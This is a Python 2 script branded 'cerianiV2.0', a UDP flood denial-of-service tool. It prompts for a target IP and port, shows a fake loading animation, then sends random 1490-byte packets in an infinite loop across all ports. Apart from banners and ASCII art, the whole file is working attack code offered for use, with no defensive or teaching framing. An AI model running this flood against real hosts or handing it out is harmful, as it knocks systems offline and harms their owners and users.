import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print ".######  ######## ########  ####    ###    ##    ## #### "
print "##    ## ##       ##     ##  ##    ## ##   ###   ##  ##  "
print "##       ##       ##     ##  ##   ##   ##  ####  ##  ##  "
print "##       ######   ########   ##  ##     ## ## ## ##  ##  "
print "##       ##       ##   ##    ##  ######### ##  ####  ##  "
print "##    ## ##       ##    ##   ##  ##     ## ##   ###  ##  "
print ".######  ######## ##     ## #### ##     ## ##    ## #### " 
print "▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒"
print "▒▒█▒▒▒▄██████████▄▒▒▒▒"
print "▒█▐▒▒▒████████████▒▒▒▒"
print "▒▌▐▒▒██▄▀██████▀▄██▒▒▒"
print "▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒"
print "▐┼▐▒▒██████████████▒▒▒"
print "▐▄▐████─▀▐▐▀█─█─▌▐██▄▒"
print "▒▒█████──────────▐███▌"
print "▒▒█▀▀██▄█─▄───▐─▄███▀▒"
print "▒▒█▒▒███████▄██████▒▒▒"
print "▒▒▒▒▒██████████████▒▒▒"
print "▒▒▒▒▒█████████▐▌██▌▒▒▒"
print "▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒"
print "▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒"
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 | "
os.system("clear")
print " iniciando cerianiV2.0 / "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 | "
os.system("clear")
print " iniciando cerianiV2.0 / "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 | "
os.system("clear")
print " iniciando cerianiV2.0 / "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 | "
os.system("clear")
print " iniciando cerianiV2.0 / "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 | "
os.system("clear")
print " iniciando cerianiV2.0 / "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 | "
os.system("clear")
print " iniciando cerianiV2.0 / "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 | "
os.system("clear")
print " iniciando cerianiV2.0 / "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 | "
os.system("clear")
print " iniciando cerianiV2.0 / "
os.system("clear")
print " iniciando cerianiV2.0 - "
os.system("clear")
print " iniciando cerianiV2.0 \ "
os.system("clear")
print "[###                 ]  "
time.sleep(1)
os.system("clear")
print "[#####               ]  "
time.sleep(1)
os.system("clear")
print "[############        ]  "
time.sleep(1)
os.system("clear")
print "[##############      ]  "
time.sleep(1)
print "[################    ]  "
time.sleep(1)
os.system("clear")
print "[#################   ]  "
time.sleep(1)
os.system("clear")
print "[##################  ]  "
time.sleep(1)
os.system("clear")
print "[################### ]  "
time.sleep(1)
os.system("clear")
print "[####################]  "
time.sleep(1)
os.system("clear")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
